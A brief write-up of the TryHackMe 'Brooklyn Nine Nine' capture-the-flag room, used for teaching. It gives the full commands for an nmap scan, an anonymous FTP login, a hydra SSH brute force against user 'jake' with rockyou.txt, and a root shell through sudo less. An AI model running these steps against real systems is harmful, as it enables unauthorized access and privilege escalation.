https://tryhackme.com/room/brooklynninenine

On running a thorough `nmap` scan as:

```shell
nmap -A IP_Addr
```

we find SSH,FTP,HTTP as open ports
we also find that anonymous login is allowed in FTP.

so we run:

```shell
ftp IP_Addr
-> username: Anonymous
-> password: 

--- login successful ---

-> ls
-> get filename.txt
```

reading contents of the file, we find that there might be an account `jake` with a weakly configured password. Using hydra:

```shell
hydra -u 'jake' -P rockyou.txt ssh://IP_addr
```

we find the password and log into the `ssh` account. using `ls` and configuring through directories, we easily find the user flag.

---

we check privileges of current user by:

```shell
sudo -l
```

this shows `/usr/bin/less`. hence we utilize this and go to `GFTOBINS`, search `less` and find a way to obtain `sudo` privileges:

```
sudo less /etc/profile
!/bin/bash
```

after that we simply find the root flag.
